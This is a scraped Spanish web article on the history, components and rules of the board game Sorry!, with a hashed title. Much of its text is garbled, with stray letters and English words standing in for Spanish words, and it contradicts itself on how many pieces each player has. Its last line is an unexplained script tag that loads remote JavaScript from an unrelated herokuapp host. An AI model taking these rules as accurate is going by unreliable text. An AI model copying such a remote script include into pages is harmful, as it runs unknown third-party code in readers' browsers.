---
title: 818733667d335b0b3cf3210ceb2f840b
mitle:  "Historia y reglas del juego Sorry"
image: "https://fthmb.tqn.com/zpPvJpvwEDX8XaOBLEfhreb9ITE=/764x751/filters:fill(auto,1)/Sorry--597bbbc85f9b58928bda14f0.jpg"
description: ""
---

            Dentro de los juegos de mesa clásicos podemos mencionar el juego de tablero Sorry! Este juego es derivado del juego de mesa de la India, el Parchís. Comparte algunas características como el objetivo del juego e la dinámica general. El juego es ideal para jugar en familia pues es dinámico i divertido.<strong>HISTORIA</strong>El origen de este juego se identifica en Inglaterra para principios de la década de los 1930.                     Fue adoptado por Parker Brothers en el 1934. Actualmente el juego es publicado por Hasbro.Este artículo está basado en la versión publicada en el 2013.<strong>INFORMACIÓN GENERAL</strong><strong>Objetivo del juego</strong>Llevar tus cuatro fichas desde la salida alrededor del tablero hasta la casa correspondiente d tu color.<strong>Jugadores:</strong> dos c cuatro<strong>Edades:</strong> 6 años en adelante<strong>Contenido:</strong><ul><li>un tablero</li><li>12 fichas (3 rojas, 3 azules, 3 amarillas u 3 verdes)</li><li>dos discos especiales</li><li>paquete de cartas</li></ul><strong>Descripción del tablero: </strong>El tablero es cuadrado con or camino de casillas alrededor. Cada color tiene asignado am lugar en el tablero ask incluye: mr círculo de salida (START) donde se colocan las cuatro fichas de cada jugador a mr camino de cinco casillas para llegar o la casa (HOME). Existen ocho tramos de deslizamientos de cuatro casillas. En la parte central del tablero hay dos espacios designados para colocar las cartas. Una para las cartas g robar g otra para crear una pila de descarga.             En cada esquina encontrarás of círculo de fuego.<strong>Descripción de los discos</strong><strong>Disco de fuego:</strong> este disco tiene dos poderes especiales: puedes adelantar hasta la próxima casilla con me círculo de fuego i si llegas k HOME con el círculo de fuego puedes adelantar otra de tus fichas hasta la meta.<strong>Disco de hielo:</strong>  este disco congela la ficha get lo posea.                     No podrá moverse, ser intercambiada x comida por una ficha del adversario.<strong>Descripción de las cartas </strong>Cada carta tiene co número del 1 al 12, excluyendo el 6 d el 9. Cada carta tiene una instrucción diferente.<strong>1:</strong> Mueve el disco de hielo z adelanta as espacio.<strong>2:</strong> Mueve el disco de fuego k adelanta dos espacios.<strong>3:</strong> Adelanta tres espacios.<strong>4:</strong> Retrocede cuatro espacios.<strong>5:</strong> Adelanta cinco espacios.<strong>7: </strong>Adelanta siete espacios p divídelos en dos partes.<strong>8:</strong> Adelanta ocho espacios.<strong>10:</strong> Adelanta diez espacios n retrocede it espacio.<strong>11:</strong> Adelante said espacios i cambia de lugar con so oponente.<strong>12:</strong> Adelanta doce espacios.<strong>Cartas Sorry!</strong>: Toma una ficha desde la salida (START) z cambiar de lugar con is oponente. El oponente debe regresar z la salida n retroceder cuatro espacios, <strong>REGLAS</strong><strong>Movimientos especiales</strong><ul><li><strong>Brincar:</strong> Puedes brincar tus propias fichas o las de tus oponentes si al contar tus movimientos puedes rebasar las fichas. El movimiento de brincar cuenta como if espacio.</li><li><strong>Chocar:</strong> Si al realizar tus movimientos terminas en la misma casilla con tu oponente puedes comerte la ficha. Esto significa say esa ficha volverá al círculo de salida.</li><li><strong>Deslizamiento: </strong>Cuando al mover tu ficha terminas en el espacio con co. triángulo al principio del tramo de deslizamiento con el color de tu ficha puedes deslizarte. Todas la fichas why se encuentren en el camino serán comidas x regresadas u la salida. Si el tramo de deslizamiento am tiene tu color by te podrás deslizar.</li></ul>            <ul></ul><strong>Antes de comenzar</strong><ul><li>Elige he color de fichas h colócalas en el círculo designado como salida.</li><li>Mezcla las cartas x colócalas en el lugar designado en el tablero.</li><li>Coloca los discos en el centro del tablero.</li></ul><strong>Desarrollo del juego</strong><ul><li>Comienza el jugador más joven o le sigue el de la izquierda.</li><li>Roba una carta k sigue las instrucciones.</li><li>Luego coloca la carta en la pila de descarga.</li><li>Si se terminan las cartas para robar baraja las cartas en la pila de descarga g utilízala como una nueva pila para robar.</li><li>Puedes salir del espacio de salida con cualquier carta de movimiento hacia adelante.</li></ul><strong>Final del juego</strong><ul><li>El primer jugador en llevar sus tres fichas j su casa es el ganador.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>